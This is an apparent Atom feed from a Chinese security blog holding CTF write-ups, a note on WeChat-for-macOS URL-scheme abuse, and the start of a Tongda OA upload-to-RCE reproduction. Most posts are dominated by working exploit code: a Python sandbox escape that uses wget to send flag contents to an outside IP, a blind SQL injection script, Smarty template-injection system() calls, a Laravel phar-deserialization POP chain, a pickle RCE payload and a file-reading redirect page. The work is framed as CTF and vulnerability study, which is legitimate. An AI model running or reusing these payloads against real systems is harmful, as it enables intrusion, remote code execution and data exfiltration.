<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fidcer&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vuln.top/"/>
  <updated>2022-02-26T16:13:03.681Z</updated>
  <id>https://vuln.top/</id>
  
  <author>
    <name>Fidcer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MAC下微信浏览器可能可行的利用方式</title>
    <link href="https://vuln.top/2022/02/27/weixin/"/>
    <id>https://vuln.top/2022/02/27/weixin/</id>
    <published>2022-02-26T16:10:33.294Z</published>
    <updated>2022-02-26T16:13:03.681Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MAC下微信浏览器可能可行的利用方式"><a href="#MAC下微信浏览器可能可行的利用方式" class="headerlink" title="MAC下微信浏览器可能可行的利用方式"></a>MAC下微信浏览器可能可行的利用方式</h1><p>在MAC下的微信浏览器，与其他浏览器不同，通过在笔记中添加协议，在用户点击后会自动执行url scheme协议，用户无需确认即可执行多种url scheme协议。</p><p>下面列出几种可行的攻击方案，但是还没有找到一种比较完美的攻击方案：</p><p>1、通过file协议可直接执行app文件，但是前提是需要文件落地，所以需要预先将文件传输，但是如果通过http等方式下载文件运行app是会触发到mac的Gatekeep机制导致无法直接运行、而在MAC OS10.15版本后通过smb等方式传输的文件会存在LSOpenURLsWithRole() failed with error -10810错误导致无法运行，即使你全部都绕过，攻击者仍然需要在知道文件路径的情况下，再让其点击链接，所以这种攻击难度较高。</p><p>2、通过MAC OS本身一些软件存在的URL Schemes，如果这些软件的URL Schemes存在漏洞或者可以bypass即可实现攻击，如通过<a href="https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/" target="_blank" rel="noopener">c</a>ve-2020-9860，具体可以看<a href="https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/" target="_blank" rel="noopener">https://blog.chichou.me/2020/07/01/x-site-escape-part-iii-cve-2020-9860-a-copycat/</a>，但这</p><p>种攻击方式成本较高，需要配合MACOS上的漏洞或其他常用软件打组合拳才能RCE。我通过将本地所有的URL Schemes进行遍历。</p><p>找到ms-powerpoint:///etc/hosts，通过微软的PPT URL Schemes可以读取到本地的文件，</p><p>具体代码如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Loading...&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">setInterval(() =&gt; &#123;location = 'ms-powerpoint:///etc/hosts'&#125;, 2000)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>在这种情况下其实只需要找到一种，将文件重定向到外网服务器的方法即可读取到任意文件，虽然通过测试发现smb可以不用输入账户密码即可连接vps，但是由于我基本功太菜暂时没有找到如何传输。</p><p>3、利用自定义到URL Scheme远程突破MAC</p><p>WINDSHIFT APT组织曾经通过该方法远程感染MACOS目标主机，在MACOS中应用程序可以“声明”自己能够支持（或者“处理”）各种文档类型以及/或者自定义的URL Scheme，且自定义的方式非常简单只需要在APP文件中的Info.plist文件加入URL Type数组即可实现，而且只需要APP文件落地到目标机器，MACOS会自动查找APP文件中Info.plist文件是否存在URL Types如果存在自动注册。</p><p>通过MACOS默认的Safari浏览器下载压缩包，后会自动解压文件，从而文件落地自定义URL Scheme在通过点击链接触发自定义的URL Scheme。但是这种方式需要绕过Gatekeeper和文件隔离，Gatekeeper可以通过给APP文件签名绕过，文件隔离需要通过给文件名添加诱惑性文字，让其点击有点类似社工方式才能实现。虽然需要用户交互，然而这种功能已经在实际攻击活动中被成功利用。具体操作可以看<a href="https://www.anquanke.com/post/id/158679" target="_blank" rel="noopener">https://www.anquanke.com/post/id/158679</a>。</p><p>虽然到最后也没有绕过，但是依然相信在用户没有确认的情况下自动运行URL Schemes协议是存在安全问题的。<br>在学习过程过我查阅各种文档过程中确实学会了很多，扩展了很多攻击面，如果有大佬可以绕过希望能让我学习学习。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MAC下微信浏览器可能可行的利用方式&quot;&gt;&lt;a href=&quot;#MAC下微信浏览器可能可行的利用方式&quot; class=&quot;headerlink&quot; title=&quot;MAC下微信浏览器可能可行的利用方式&quot;&gt;&lt;/a&gt;MAC下微信浏览器可能可行的利用方式&lt;/h1&gt;&lt;p&gt;在MAC下的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>观安杯2021 Writeup</title>
    <link href="https://vuln.top/2021/09/05/16308495601985/"/>
    <id>https://vuln.top/2021/09/05/16308495601985/</id>
    <published>2021-09-05T13:46:00.199Z</published>
    <updated>2021-09-05T14:59:10.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Baby-Calc"><a href="#Baby-Calc" class="headerlink" title="Baby Calc"></a>Baby Calc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">通过测试发现该环境为python3沙盒逃逸</span><br><span class="line">通过网上公开的POC发现存在代码执行，但是无法回显</span><br><span class="line">尝试反弹SHELL均失败</span><br><span class="line">发现系统不存在curl命令，但存在wget通过wget命令携带回显带出到vps</span><br></pre></td></tr></table></figure><p>如下图使用wget，把命令包含在``中在使用base64带到vps中<br><img src="https://vuln.top/2021/09/05/16308495601985/1.png" alt="1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POC:expr=__import__(&quot;os&quot;).__getattribute__(&quot;metsys&quot;[::-1])(&quot;wget%20http://49.234.223.23:1234/1.txt?data=`cat%20/flag_is_here|grep%20flag|base64`&quot;)</span><br></pre></td></tr></table></figure><p>vps监听：<br><img src="https://vuln.top/2021/09/05/16308495601985/2.png" alt="2"></p><h2 id="Baby-WEB"><a href="#Baby-WEB" class="headerlink" title="Baby WEB"></a>Baby WEB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">题目提供了源代码，查看incloud.php文件，发现57行存在file_put_contents函数，且password未做限制。通过构造poc使password造成任意文件读取漏洞</span><br></pre></td></tr></table></figure><p><img src="https://vuln.top/2021/09/05/16308495601985/16308507210959.jpg" alt="-w1134"></p><p>POC:<code>1|../../../../../../../../flag|</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册任意用户名，密码为POC，登陆密码为1。</span><br><span class="line">登陆后返回flag</span><br></pre></td></tr></table></figure><p><img src="https://vuln.top/2021/09/05/16308495601985/16308507640380.jpg" alt="-w552"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="老电脑的内存"><a href="#老电脑的内存" class="headerlink" title="老电脑的内存"></a>老电脑的内存</h2><p>经典的内存取证题目，通过imageinfo来获取该内存镜像的摘要信息<br><img src="https://vuln.top/2021/09/05/16308495601985/16308508816927.jpg" alt="-w966"><br>查看缓存在内存中的注册表：<br><img src="https://vuln.top/2021/09/05/16308495601985/16308508960121.jpg" alt="-w996"><br>获取 SAM 表中的用户：<br><img src="https://vuln.top/2021/09/05/16308495601985/16308509103690.jpg" alt="-w1005"><br>查看内存中系统的密码：<br><img src="https://vuln.top/2021/09/05/16308495601985/16308509224912.jpg" alt="-w969"><br>CMD5解密<br><img src="https://vuln.top/2021/09/05/16308495601985/16308509294061.jpg" alt="-w909"><br>通过filescan查找ctf用户下的文件 发现1.png</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f Windows\ 7-c0e05742.vmem --profile=Win7SP1x86_23418 filescan | grep ctf</span><br></pre></td></tr></table></figure><p><img src="https://vuln.top/2021/09/05/16308495601985/16308509546496.jpg" alt="-w1002"><br>将1.png dump下来，查看文件。与密码结合获得flag<br><img src="https://vuln.top/2021/09/05/16308495601985/16308509648154.jpg" alt="-w915"></p><p><img src="https://vuln.top/2021/09/05/16308495601985/16308509739729.jpg" alt="-w997"><br>##被加密的wifi<br>通过分析数据包发现key为88888888<br><img src="https://vuln.top/2021/09/05/16308495601985/16308510039551.jpg" alt="-w528"><br>通过airdecap-ng命令输入密码解密数据包<br><img src="https://vuln.top/2021/09/05/16308495601985/16308510142741.jpg" alt="-w695"><br>在已解密的数据包中找到flag<br><img src="https://vuln.top/2021/09/05/16308495601985/16308510348552.jpg" alt="-w974"></p><h2 id="release"><a href="#release" class="headerlink" title="release"></a>release</h2><p>拿到一张图片，首先使用<code>binwalk</code>分离文件，没有发现有用信息<br><img src="https://vuln.top/2021/09/05/16308495601985/16308511070136.jpg" alt="-w696"><br>通过winhex修改文件高度<br><img src="https://vuln.top/2021/09/05/16308495601985/16308511475227.jpg" alt="-w813"><br>得到一半flag<br><img src="https://vuln.top/2021/09/05/16308495601985/16308511600485.jpg" alt="-w805"><br>翻到文件底部发现很多20和09，想到通过二进制生成二维码，将20修改为0，09改为1<br><img src="https://vuln.top/2021/09/05/16308495601985/16308512337387.jpg" alt="-w854"><br>使用脚本转换为图片，得到二维码<br><img src="https://vuln.top/2021/09/05/16308495601985/16308512567725.jpg" alt="-w826"><br>扫描得到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;Baby-Calc&quot;&gt;&lt;a href=&quot;#Baby-Calc&quot; class=&quot;headerlink&quot; title=&quot;Bab
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://vuln.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>卫生健康行业CTF</title>
    <link href="https://vuln.top/2021/07/13/16261510553094/"/>
    <id>https://vuln.top/2021/07/13/16261510553094/</id>
    <published>2021-07-13T06:09:08.358Z</published>
    <updated>2021-07-13T06:09:08.358Z</updated>
    
    <content type="html"><![CDATA[<h1 id="卫生健康行业CTF"><a href="#卫生健康行业CTF" class="headerlink" title="卫生健康行业CTF"></a>卫生健康行业CTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h3><p>下载源码本地搭建环境，最下方cms名字叫闪灵<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134530.jpg" alt><br>搜索相关cms漏洞，发现前台存在一个sql延迟注入，构造poc<br><code>1/**/AND/**/(if(ascii(substr((select/**/A_pwd/**/from/**/SL_admin/**/limit/**/0,1),1,1))&lt;&gt;50,1,sleep(3)))=xxx</code><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134557.jpg" alt><br>编写python脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">#Author:Ca1s1</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">headers = &#123;&quot;user-agent&quot;:&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)&quot;&#125;</span><br><span class="line">chars = &apos;abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.&apos;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">#global flag</span><br><span class="line"></span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for char in chars:</span><br><span class="line">        charAscii = ord(char)</span><br><span class="line">        url = &quot;http://vuln/function/form.php?action=input&quot;</span><br><span class="line">        data = &#123;&apos;1/**/AND/**/(if(ascii(substr((select/**/A_pwd/**/from/**/SL_admin/**/limit/**/0,1),%s,1))&lt;&gt;%s,1,sleep(3)))&apos;%(i,charAscii):&quot;xxxx&quot;&#125;</span><br><span class="line">        #urlformat = data.format(i,charAscii)</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        rsp = requests.post(url=url,data=data,headers=headers)</span><br><span class="line">        #print(data)</span><br><span class="line">        if  time.time() - start_time &gt; 2.5:</span><br><span class="line">            flag+=char</span><br><span class="line">            #print(flag)</span><br><span class="line">            print(&apos;flag:&apos;,flag)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print(&apos;flag is &apos; + flag)</span><br></pre></td></tr></table></figure><p>获得账号密码后登陆后台,允许上传格式添加一个ini<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134615.jpg" alt><br>在后台管理处上传文件<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134628.jpg" alt><br>上传一个.user.ini文件，文件内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=test.jpg</span><br></pre></td></tr></table></figure><p>在上传一个test.jpg，内容为phpinfo<br>访问index.php，即可代码执行<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134641.jpg" alt></p><h3 id="Super-hacker"><a href="#Super-hacker" class="headerlink" title="Super_hacker"></a>Super_hacker</h3><p>根据提示<br>Via 头需要有值；X-Forwarded-For 存在smarty的模板注入<br>添加Via头和X-Forwarded-For:<br>通过<code>{system(&#39;ls&#39;)}</code>执行命令<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134713.jpg" alt><br>但是空格和i都被过滤了需要绕过，通过<code>$smarty.get.jan</code>将输入点变为get请求从而绕过(还有一个办法通过\t绕过空格从而命令执行)<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134748.jpg" alt></p><h3 id="easy-web1"><a href="#easy-web1" class="headerlink" title="easy_web1"></a>easy_web1</h3><p>查看源代码，发现<code>There_is_no_flag_here.php</code><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134800.jpg" alt><br>只允许本地访问<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134812.jpg" alt><br>添加http头部，获得flag<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134827.jpg" alt></p><h3 id="Easy-web1"><a href="#Easy-web1" class="headerlink" title="Easy_web1"></a>Easy_web1</h3><p>网上的一道原题<br>通过<code>/???/????64%20/????.???</code><br>通过<code>？</code>匹配单个字符，使用<code>base64</code>命令进行绕过<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134843.jpg" alt><br>通过burpsuite的<code>decode</code>，base64解码<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134854.jpg" alt></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="BASE64编码"><a href="#BASE64编码" class="headerlink" title="BASE64编码"></a>BASE64编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R1kzRE1RWldHRTNET04yQ0dZWkRNTUpYR00zREtNWldHTTJES1JSVEdNWlRFTktHR01ZVEdOUlZJWTNES05SUkc0WlRPT0pWSVkzREVOUlJHNFpUTU5KWElRPT09PT09</span><br></pre></td></tr></table></figure><p>Base64 -&gt; base32 -&gt; 16进制<br>base64 decode<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134911.jpg" alt><br> base32 decode<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134921.jpg" alt><br>16进制转换<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134931.jpg" alt></p><h3 id="医学影像"><a href="#医学影像" class="headerlink" title="医学影像"></a>医学影像</h3><p>打开文件发现一堆以.dcm后缀结尾的文件（这是啥呀）</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713135005.png" alt><br>经过百度之后得知这是那啥CT的片子。下载Sante DICOM Editor，dicom文件查看器</p><blockquote><p><a href="http://www.downxia.com/downinfo/30150.html" target="_blank" rel="noopener">http://www.downxia.com/downinfo/30150.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713134943.png" alt></p><p>导入题目文件**</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713135020.png" alt><br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713135030.png" alt><br>选择页面下方的MPR**<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713135038.png" alt></p><p>可自行调整颜色，使缺失部分的黑线更加明显**</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713135049.png" alt></p><p>拖动定位标至黑线出（慢慢找） 得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210713135059.png" alt></p><p>flag{You_find_it}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;卫生健康行业CTF&quot;&gt;&lt;a href=&quot;#卫生健康行业CTF&quot; class=&quot;headerlink&quot; title=&quot;卫生健康行业CTF&quot;&gt;&lt;/a&gt;卫生健康行业CTF&lt;/h1&gt;&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://vuln.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>虎符线下赛WEB</title>
    <link href="https://vuln.top/2021/05/09/16204457586099/"/>
    <id>https://vuln.top/2021/05/09/16204457586099/</id>
    <published>2021-05-09T01:50:00.807Z</published>
    <updated>2021-05-09T01:50:00.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="tinypng"><a href="#tinypng" class="headerlink" title="tinypng"></a>tinypng</h2><p>题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120346.png" alt><br>首先查看路由信息<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120417.png" alt></p><p>先查看一下<code>fileupload</code>路由，可以发现文件上传时对内容进行了过滤，且只允许上传<code>png</code><br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120443.png" alt></p><p>接着我们看image路由，进入<code>ImageController</code>，<code>$source</code>可控接着判断是否为<code>png</code>结尾，如果为<code>png</code>结尾则传给<code>imgcompress</code>类。<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120510.png" alt><br>进入<code>imgcompress</code>类，<code>$this-&gt;src</code>为我们传入的<code>$source</code><br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120529.png" alt><br>接着又传递给<code>compressImg</code>类，调用了<code>openImg</code>方法<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120551.png" alt></p><p>将<code>$source</code>传递给了<code>getimagesize</code>，<code>getimagesize</code>可以触发<code>phar</code>反序列化<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120612.png" alt></p><p>现在只需要绕过文件上传内容检测即可，我们可以通过gzip的方式绕过。<br>从网上找一个Laravel 8的公开的反序列化POP链漏洞即可，如下给出我使用的exp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">namespace Illuminate\Broadcasting &#123;</span><br><span class="line">    class PendingBroadcast &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct($events, $event) &#123;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class BroadcastEvent &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct($connection) &#123;</span><br><span class="line">            $this-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Bus &#123;</span><br><span class="line">    class Dispatcher &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        public function __construct($queueResolver)&#123;</span><br><span class="line">            $this-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $c = new Illuminate\Broadcasting\BroadcastEvent(&apos;whoami&apos;);</span><br><span class="line">    $b = new Illuminate\Bus\Dispatcher(&apos;system&apos;);</span><br><span class="line">    $a = new Illuminate\Broadcasting\PendingBroadcast($b, $c);</span><br><span class="line">    #print(urlencode(serialize($a)));</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar=new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&apos;GIF89a&apos;.&quot;__HALT_COMPILER();&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($a);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过如上exp生成<code>phar</code>文件，使用<code>gzip</code>打包修改为png后缀<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120640.png" alt></p><p>上传文件<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120729.png" alt></p><p>访问<code>/image?image=phar://../storage/app/uploads/xx.png</code>，成功代码执行<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120747.png" alt></p><h2 id="Easyflask"><a href="#Easyflask" class="headerlink" title="Easyflask"></a>Easyflask</h2><p>根据页面提示访问<code>/file?file=/app/source</code>可以获取到源代码<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120805.png" alt></p><p>把代码复制到本地编辑器，便于分析。可以看到<code>file</code>路由为文件读取，对后缀存在一定限制，但是也可以读取到部分文件。<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120823.png" alt></p><p>在代码头部发现SECRET_KEY存放在环境变量中<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120839.png" alt></p><p>我们可以通过读取/proc/self/environ文件，获得SECRET_KEY<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120853.png" alt></p><p>接着看admin路由存在pickle.loads，u参数可控那么就存在python反序列化漏洞（参考<a href="https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/）" target="_blank" rel="noopener">https://daolgts.github.io/2019/09/20/python%20pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/）</a><br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508120916.png" alt><br>编写并运行EXP脚本，获得一串BASE64</p><figure class="highlight plain"><figcaption><span>base64</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class User(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        a = &quot;`cat /flag &gt;/tmp/1.txt `&quot;</span><br><span class="line">        return (os.system,(a,))</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(u)</span><br><span class="line">bu = base64.b64encode(u)</span><br><span class="line">print(bu)</span><br></pre></td></tr></table></figure><p>接着通过获取到的KEY，使用脚本伪造FLASK的Session（<a href="https://github.com/noraj/flask-session-cookie-manager）" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager）</a><br>-s参数为SECRET_KEY，-t 参数为反序列化的内容<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121004.png" alt></p><p>通过生成出的Session访问/admin路径，返回500为成功<br> <img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121023.png" alt></p><p>接着进行文件读取获得flag<br><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/img/20210508121037.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;tinypng&quot;&gt;&lt;a href=&quot;#tinypng&quot; class=&quot;headerlink&quot; title=&quot;tinypng&quot;&gt;&lt;/a&gt;tinypng&lt;/h2&gt;&lt;p&gt;题目提供了源代码，通过php artisan 命令，可以看到是Laravel 8.15框架&lt;br&gt; 
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://vuln.top/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>通达OA文件上传&amp;文件包含导致RCE复现</title>
    <link href="https://vuln.top/2021/01/10/%E9%80%9A%E8%BE%BEOA%20RCE%20ba4198aa1bc74121b6f9eca32428c756/"/>
    <id>https://vuln.top/2021/01/10/通达OA RCE ba4198aa1bc74121b6f9eca32428c756/</id>
    <published>2021-01-10T01:39:58.000Z</published>
    <updated>2021-01-10T09:50:18.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h1><h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">V11版</span><br><span class="line"><span class="number">2017</span>版</span><br><span class="line"><span class="number">2016</span>版</span><br><span class="line"><span class="number">2015</span>版</span><br><span class="line"><span class="number">2013</span>版</span><br><span class="line"><span class="number">2013</span>增强版</span><br></pre></td></tr></table></figure><h3 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11.2</span><span class="number">.191129</span></span><br></pre></td></tr></table></figure><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>通过 <code>/ispirit/im/upload.php</code> 页面，未授权文件上传一个一句话文件，可获得路径和文件名。</p><p><img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled.png" alt="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled.png"></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 